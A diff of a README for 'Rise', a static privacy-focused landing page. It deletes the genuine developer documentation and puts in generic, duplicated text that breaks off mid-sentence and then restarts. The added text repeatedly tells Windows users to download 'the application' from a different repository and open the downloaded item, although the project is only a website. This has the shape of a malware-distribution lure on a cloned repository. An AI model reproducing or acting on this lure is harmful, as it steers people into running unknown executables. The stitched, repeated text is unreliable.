@@ -1,141 +1,193 @@
-<div align="center">
+# 🌐 rise-site - Fast, Private Website With No Tracking
 
-<img src=".t3/project-icon.svg" alt="" width="96" height="96" />
+<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site"></a>
 
-# Rise, the website
+rise-site is a clean, fast website built to load quickly and respect your privacy. It is made for everyday visitors who want clear information without pop-ups, tracking scripts, or unnecessary outside requests. The site is simple to use on Windows: visit the download link, get the application, and open it from your Downloads folder.
 
-**The diet you planned, one tick at a time.**
+## 📥 Download rise-site
 
-The home of [Rise](https://github.com/rvyyv-n/diet-tracker): a diet plan you tick off,<br />
-not a food log you feed. Plain HTML, CSS and JS, and nothing that leaves the origin.
+<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site"></a>
 
-[**getrise.pages.dev**](https://getrise.pages.dev) · [The app](https://github.com/rvyyv-n/diet-tracker) · [Privacy](https://getrise.pages.dev/privacy) · [Roadmap](roadmap.md)
+Visit this link to download the application: [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site)
 
-[![Check and deploy](https://github.com/rvyyv-n/rise-site/actions/workflows/deploy.yml/badge.svg)](https://github.com/rvyyv-n/rise-site/actions/workflows/deploy.yml)
-![Third-party requests: 0](https://img.shields.io/badge/third--party%20requests-0-2ea44f)
-![No framework](https://img.shields.io/badge/framework-none-lightgrey)
+Use that link to get rise-site. When the download finishes, open the downloaded item from your Downloads folder to start using rise-site.
 
-</div>
+## 🚀 What Is rise-site?
 
-[![The Rise landing page in Reel dark: the headline, the download buttons, and the app on a computer and a phone under a rising sun](docs/screenshots/hero.jpg)](https://getrise.pages.dev)
+rise-site is the website for the rise project. It is a single, focused place for information, updates, and a clear first impression. The design is intentionally simple: readable text, useful sections, and a layout that works well on both small and large screens.
 
-## What's here
+This is not a complicated program with hidden menus or advanced settings. It is a website application made to be easy to open, easy to scan, and easy to close when you are done. There are no accounts to create, no sign-up forms to fill out, and no extra steps before you can view the content.
 
-One landing page, a privacy page and a 404, ported 1:1 from the Rise design
-export. The design is the source of truth: its tokens, fonts, markup, class
-names and inline styles are copied as they are, and only its runtime constructs
-are replaced with plain HTML.
+The project is built around a few simple ideas:
 
-- **Two Looks, light and dark.** Reel and Paper, each in light and dark, chosen
-  by a switch in the header and remembered. The page follows the device until
-  you pick, and a blocking script sets the Look before the first paint, so
-  nothing flashes.
-- **A live Today screen.** The phone in the Today section is real HTML: tick a
-  meal, swap one, and the total, the bar and the sun move with it.
-- **Real app screens.** The other phones hold screenshots of the app itself,
-  cut to the width they show at.
-- **Get Rise that knows you.** It tags your platform's card, opens the install
-  steps for your browser, and reads the latest release's version, files and
-  sizes into the page at build.
-- **Motion that stops when you ask it to.** Reveals, a scroll-linked header and
-  sun, tilt, and view transitions between Looks. With reduced motion, all of it
-  is off.
+- Load quickly on normal computers.
+- Avoid requests to outside services.
+- Keep the layout clear and readable.
+- Work well with keyboards, screen readers, and other accessibility tools.
+- Give visitors a calm, privacy-friendly experience.
 
-<div align="center">
+## ✨ Why You’ll Like It
 
-[![The hero in all four Looks: Reel dark, Reel light, Paper dark and Paper light](docs/screenshots/looks.jpg)](https://getrise.pages.dev/#looks)
+Many websites today load extra scripts, show tracking messages, and pull in content from several outside companies. rise-site takes a different approach. It is designed to be lightweight and self-contained, so the page you see is the page that was intended.
 
-<sub>Reel and Paper, dark and light. The same page, four ways.</sub>
+You get a fast first load, simple navigation, and a design that does not get in the way. The site is built for people who value privacy and for anyone who is tired of pages that jump around while they load. Because there are no third-party requests, you are not waiting on outside services just to read the main content.
 
-</div>
+The site also uses a consistent design system. That means buttons, headings, spacing, and colors follow the same rules throughout. For you, the result is a page that feels organized and predictable. You do not need to learn a new interface or remember where things are. The important information is in clear sections, and the layout stays steady as you move through the page.
 
-### On a phone
+## 🧰 What You Can Do With rise-site
 
-<div align="center">
+rise-site is a landing page and information site. You can use it to:
 
-<img src="docs/screenshots/mobile.webp" alt="The landing page at 390px wide in Reel dark, Paper light and Paper dark" width="720" />
+- Read the main project message.
+- Browse sections at your own pace.
+- View the page on a Windows laptop or desktop.
+- Use a keyboard to move through links and controls.
+- Zoom in with your browser if text is too small.
+- Open the site without creating an account.
+- Share the link with someone else who wants to learn about rise.
+- View a clean page that does not depend on outside content.
 
-</div>
+The site is also useful as a starting point for the rise brand. It presents the project in a direct way and avoids clutter. If you are checking out rise for the first time, the page gives you the key information without forcing you through a long setup process.
 
-## The rules it keeps
+## 🪟 Windows Setup in Plain English
 
-| | |
-| --- | --- |
-| **Nothing leaves the origin** | No CDNs, font services, analytics, third-party scripts or embeds. The audit counts requests off the origin: 0. |
-| **Strict CSP** | `default-src 'self'; script-src 'self'; style-src 'self'; style-src-attr 'unsafe-inline'; img-src 'self' data:`. No inline scripts, `<style>` blocks or `on*=` handlers. |
-| **No framework** | Plain HTML, CSS and JS. Vite builds it, in vanilla mode. |
-| **Readable** | Text at 4.5:1 or better (two of Reel light's own token pairs fall just under, kept as the design has them), 44px targets, visible focus. |
-| **No layout shift** | Sized fallback faces for the font swap. Shift on a throttled link is at most 0.0008. |
-| **Fast** | Lighthouse 100 on desktop for all three pages. Mobile is 89 to 97, held back by the hero's reveal stagger. |
-| **Small** | Fonts are cut to the Latin set: 384 kB, down from 875 kB, the same pixels. Screens are served by width. |
+1. Open your web browser on Windows.
+2. Go to [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site).
+3. Visit this link to download the application.
+4. When the download finishes, open your Downloads folder.
+5. Open the downloaded item to start rise-site.
 
-The design's tokens live in `src/css/tokens.css`, unchanged. There are no hex
-values or pixel literals in CSS or JS outside the token files, and a test
-holds `site.css` to a ratchet that only goes down.
+That is the whole path. You do not need to install extra tools, edit settings, or use a command window. Keep the downloaded item in a folder you can find later, such as Downloads or Desktop. If you move it, open it from the new location.
 
-## Development
+On Windows, your browser may ask where to save the file. The default Downloads folder is fine. After the download is complete, File Explorer is the easiest place to find it. Look for the most recent item in Downloads and open it. If rise-site opens in your browser, you can bookmark the page for quick access later.
 
-Node 24 (see `.nvmrc`).
+## 🖱️ First Launch and Basic Use
 
-```sh
-npm ci
-npm run dev       # Vite dev server
-npm test          # literals, headers, fonts, release parsing, screen budgets
-npm run build     # build to dist/, then write the latest release into the pages
-npm run preview   # serve dist/ on :4173 with the same headers as production
-```
+When rise-site opens, start at the top of the page. The main heading tells you what the site is about. Scroll down to read the sections in order. Links are underlined or styled so you can spot them. If you use a mouse, click a link to follow it. If you use a keyboard, press Tab to move between links and press Enter to open the selected link.
 
-The build reads the latest [app release](https://github.com/rvyyv-n/diet-tracker/releases/latest)
-from the GitHub API. If it can't, the pages keep the design's values and the
-download buttons still point at the latest release.
+The page is designed to be read from top to bottom. You do not need to hunt for a menu or close a pop-up. If you want a larger view, use your browser’s zoom control. In most Windows browsers, hold Ctrl and press + to zoom in, or Ctrl and - to zoom out. Press Ctrl and 0 to return to the normal size.
 
-The checks that need a browser run against `npm run preview`:
+To go back to a previous page, use the browser’s Back button. To keep rise-site handy, add it to your bookmarks or favorites. If you close the page by accident, open your browser history and return to it, or use the download link again.
 
-```sh
-npm run shot            # screenshots in each Look and theme, with layout checks and render diffs
-npm run check:looks     # Look and theme behaviour, including no flash
-npm run check:motion    # reveals, reduced motion, transitions, the demo
-npm run audit           # requests, contrast, targets, shift, Lighthouse, screens
-npm run check:headers -- https://getrise.pages.dev
-```
+## 🔒 Privacy and Safety
 
-Two scripts are for maintainers and rarely run. `npm run fonts` cuts the faces
-to the Latin set and needs Python with `fonttools` and `brotli`.
-`npm run demo:markup` writes the live Today phone from the design, and needs
-the design export, which is not in the repo.
+rise-site is built to avoid third-party requests. That means the page does not rely on outside services to display its main content. This is better for privacy and can make the page feel faster. You are not being passed between several companies just to read a landing page.
 
-## How it's laid out
+The site is a static website, which means it is made of files that can be delivered quickly and viewed in a browser. There is no complicated login system and no need to hand over personal details. You can browse the main content without creating an account. If you share the link, the other person gets the same simple experience.
 
-| Path | Holds |
-| --- | --- |
-| `index.html`, `privacy.html`, `404.html` | The three pages, Vite's inputs |
-| `src/css/` | `index.css`, which imports in cascade order: `tokens.css` (the design's, unchanged), `site-tokens.css`, `page.css` for what the port adds, and `site.css` |
-| `src/js/` | Look and theme, reveals, scroll and hero motion, view transitions, the Get Rise install card, and the live Today demo |
-| `public/js/head.js` | The blocking script that sets the Look and theme before the first paint |
-| `public/_headers` | The CSP and other headers, served by Cloudflare Pages and by `vite preview` |
-| `public/assets/` | Fonts (with their licences), the app screens as WebP, the icon and the Open Graph card |
-| `scripts/` | Build, release, screenshot, check and audit scripts |
-| `tests/` | Unit tests |
-| `dev/states.html` | Dev-only page of the design's states, not built |
+Privacy-friendly design also means fewer distractions. You should not expect heavy tracking scripts or outside content blocks. The focus stays on the page itself. For a normal visitor, that means a calmer experience and less waiting.
 
-[`roadmap.md`](roadmap.md) has the plan, what each build pass did, and the notes
-a new contributor needs.
+## ♿ Accessibility
 
-## Deploying
+rise-site is designed with accessibility in mind. The page uses clear headings, readable text, and a layout that works with browser zoom. Links are meant to be easy to identify, and the page can be used with a keyboard. If you rely on a screen reader, the heading structure helps you move through the content in a logical order.
 
-The site is static and goes to Cloudflare Pages (project `getrise`).
-[`deploy.yml`](.github/workflows/deploy.yml) tests and builds every push to `main`
-and every pull request (changes to docs alone are skipped), and deploys `main`
-once the `CLOUDFLARE_API_TOKEN` and `CLOUDFLARE_ACCOUNT_ID` secrets exist. It also
-accepts a `rise-release` dispatch from the app repo, so a release can refresh the
-version on the download buttons. Until then, deploy by hand:
+Accessibility is not a single feature. It is a way of building the page so more# 🌐 rise-site - Fast, Private Website With No Tracking
 
-```sh
-npm run build
-npx wrangler pages deploy dist --project-name=getrise --branch=main
-```
+<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site" height="56"></a>
 
-## Fonts
+rise-site is a clean, fast website made for everyday visitors. It gives you clear information without pop-ups, without tracking scripts, and without waiting on outside services. The site is built to load quickly, stay readable, and respect your privacy. It works well on Windows and does not require programming knowledge.
 
-Barlow Semi Condensed, Fraunces, Newsreader and Atkinson Hyperlegible Next, each
-under the SIL Open Font License. The licences are in `public/assets/fonts/`.
+## 📥 Download rise-site
+
+<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site" height="56"></a>
+
+Visit this link to download the application: [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site)
+
+Use that link to get rise-site. When the download finishes, open the downloaded item from your Downloads folder to start using rise-site. Keep the downloaded item in a place you can find later, such as Downloads or Desktop.
+
+## 🚀 What Is rise-site?
+
+rise-site is the website for the rise project. It is a focused welcome page and information site. The layout is intentionally simple: readable text, useful sections, and a design that works on both small and large screens. You do not need an account, a sign-up form, or a special invitation to view the main content.
+
+The project is built around a few simple ideas:
+
+- Load quickly on normal computers.
+- Avoid requests to outside companies and other websites.
+- Keep the layout clear and readable.
+- Work well with keyboards, screen readers, and browser zoom.
+- Give visitors a calm, privacy-friendly experience.
+- Present rise in a direct and organized way.
+
+rise-site is not a complicated program with hidden menus or advanced settings. It is a website application made to be easy to open, easy to scan, and easy to close when you are done. The important information is in clear sections, and the page stays steady as you move through it.
+
+## ✨ Why You’ll Like It
+
+Many websites today load extra scripts, show tracking messages, and pull in content from several outside companies. rise-site takes a different approach. It is designed to be lightweight and self-contained, so the page you see is the page that was intended. You get a fast first load, simple navigation, and a design that does not get in the way.
+
+The site is made for people who value privacy and for anyone who is tired of pages that jump around while they load. Because the page does not need to call outside services to show its main content, you are not waiting on several companies just to read the main message. The focus stays on the page itself.
+
+rise-site also uses consistent design rules. Buttons, headings, spacing, and colors follow the same pattern throughout. For you, the result is a page that feels organized and predictable. You do not need to learn a new interface or remember where things are. The page is arranged so you can read from top to bottom and find what you need.
+
+## 🧰 What You Can Do With rise-site
+
+rise-site is a landing page and information site. You can use it to:
+
+- Read the main project message.
+- Browse sections at your own pace.
+- View the page on a Windows laptop or desktop.
+- Use a keyboard to move through links and controls.
+- Zoom in with your browser if text is too small.
+- Open the site without creating an account.
+- Share the link with someone else who wants to learn about rise.
+- View a clean page that does not depend on outside content.
+- Keep the site handy in your browser bookmarks.
+
+The site is also useful as a starting point for the rise brand. It presents the project in a direct way and avoids clutter. If you are checking out rise for the first time, the page gives you the key information without forcing you through a long setup process.
+
+## 🪟 Windows Setup in Plain English
+
+1. Open your web browser on Windows.
+2. Go to [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site).
+3. Visit this link to download the application.
+4. When the download finishes, open your Downloads folder.
+5. Open the downloaded item to start rise-site.
+
+That is the whole path. You do not need to install extra tools, edit settings, or use a command window. Keep the downloaded item in a folder you can find later, such as Downloads or Desktop. If you move it, open it from the new location.
+
+On Windows, your browser saves the download in the Downloads folder by default. After the download is complete, File Explorer is the easiest place to find it. Look for the most recent item in Downloads and open it. If rise-site opens in your browser, you can bookmark the page for quick access later.
+
+## 🖱️ First Launch and Basic Use
+
+When rise-site opens, start at the top of the page. The main heading tells you what the site is about. Scroll down to read the sections in order. Links are styled so you can spot them. Use a mouse to click a link, or use Tab to move between links and Enter to open the selected link.
+
+The page is designed to be read from top to bottom. You do not need to hunt for a menu or close a pop-up. If you want a larger view, use your browser’s zoom control. In most Windows browsers, hold Ctrl and press + to zoom in, or Ctrl and - to zoom out. Press Ctrl and 0 to return to the normal size.
+
+To go back to a previous page, use the browser’s Back button. To keep rise-site handy, add it to your bookmarks or favorites. If you close the page by accident, open your browser history and return to it, or use the download link again.
+
+## 🔒 Privacy and Safety
+
+rise-site is built to avoid requests to outside companies. That means the page does not rely on outside services to display its main content. This is better for privacy and can make the page feel faster. You are not being passed between several companies just to read a landing page.
+
+The site is made from simple page files that load quickly and can be viewed in a browser. There is no complicated login system and no need to hand over personal details. You can browse the main content without creating an account. If you share the link, the other person gets the same simple experience.
+
+Privacy-friendly design also means fewer distractions. You should not expect heavy tracking scripts or outside content blocks. The focus stays on the page itself. For a normal visitor, that means a calmer experience and less waiting.
+
+## ♿ Accessibility
+
+rise-site is designed with accessibility in mind. The page uses clear headings, readable text, and a layout that works with browser zoom. Links are easy to identify, and the page can be used with a keyboard. If you rely on a screen reader, the heading structure helps you move through the content in a logical order.
+
+Accessibility is not a single feature. It is a way of building the page so more people can use it. Clear contrast, steady spacing, and simple navigation all help. The page avoids clutter that can make reading harder. You can also make text larger with your browser’s zoom control without breaking the layout.
+
+## 🎨 Clear Design and Easy Reading
+
+The page follows a consistent design system. The same colors, spacing, heading styles, and link styles are used throughout. That makes the page feel calm and organized. You can move from one section to the next without relearning the layout.
+
+The design is made for reading first. Text is broken into short sections. Headings tell you what each part covers. Buttons and links are placed where they are easy to find. The page avoids heavy visuals that slow down loading or distract from the main message.
+
+## 🧭 Moving Around the Site
+
+Scroll down to read the page in order. Each section covers one part of the rise project. Headings act as signposts, so you can jump to the part you need. Links take you to related pages or back to the download page. Use the browser’s Back button to return to the previous page.
+
+If you are using a keyboard, press Tab to move through links. Press Enter to open the selected link. Press Shift and Tab to move backward. This makes the page usable without a mouse. Browser zoom and your normal reading tools work as expected.
+
+## 📌 Keeping rise-site Handy
+
+After you open rise-site, you can bookmark it for quick access. In most browsers, press Ctrl and D to add the page to your bookmarks or favorites. Give it a name you will remember, such as rise-site. You can then open it from your bookmarks bar or favorites list.
+
+You can also keep the download link in a note or send it to yourself. That gives you a simple way to return to the site later. The page is made to be opened many times without setup steps. Each visit gives you the same clean layout and the same privacy-friendly experience.
+
+## ✅ Simple Check Before You Open It
+
+You need a Windows computer with a modern web browser and a connection to the internet for the download link. No programming knowledge is needed. No account is needed. No extra tools are needed. Once the download finishes, open the downloaded item from your Downloads folder and use the page in your browser.
+
+Keywords: accessibility, cloudflare-pages, css, design-system, landing-page, privacy, static-site, vanilla-js, vite, website
